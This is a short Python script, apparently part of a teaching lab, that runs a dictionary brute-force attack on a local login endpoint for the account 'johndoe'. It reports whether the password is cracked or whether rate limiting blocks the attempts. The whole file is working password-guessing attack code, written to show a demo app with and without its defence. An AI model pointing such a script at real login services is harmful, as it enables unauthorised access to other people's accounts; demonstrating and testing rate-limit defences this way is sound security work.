import requests
import time

BASE_URL = "http://127.0.0.1:5000"
TARGET_USER = "johndoe"

# Wordlist of common dictionary passwords
WORDLIST = [
    "admin123",
    "123456",
    "welcome1",
    "qwerty",
    "iloveyou",
    "monkey",
    "password123", # Correct password
    "supersecret"
]

def attack():
    print("="*60)
    print("       AUTHENTICATION BRUTE-FORCE ATTACK SCRIPT       ")
    print("="*60)
    print(f"[+] Target Account: {TARGET_USER}")
    print(f"[+] Wordlist Size:  {len(WORDLIST)} candidates\n")
    
    session = requests.Session()
    
    for idx, pwd in enumerate(WORDLIST, 1):
        print(f"[{idx}/{len(WORDLIST)}] Attempting password: '{pwd}' ... ", end="", flush=True)
        
        data = {
            'username': TARGET_USER,
            'password': pwd
        }
        
        resp = session.post(f"{BASE_URL}/login_bruteforce", data=data)
        
        if "Authenticated as" in resp.text or "Welcome," in resp.text or "Dashboard" in resp.text:
            print(">>> [!] CRACKED! Password found: " + pwd)
            print("[+] Login was successful. Rate limiting was absent!")
            return
        elif resp.status_code == 429 or "Rate Limit Exceeded" in resp.text or "locked" in resp.text:
            print(">>> [-] BLOCKED! Server enforced rate-limiting (HTTP 429 Lockout).")
            print("[+] Defense Active: Patched mode successfully halted the brute-force attack.")
            return
        else:
            print("Failed")
            
        time.sleep(0.2) # Small delay for readable output

    print("\n[-] Wordlist exhausted without cracking.")

if __name__ == '__main__':
    attack()
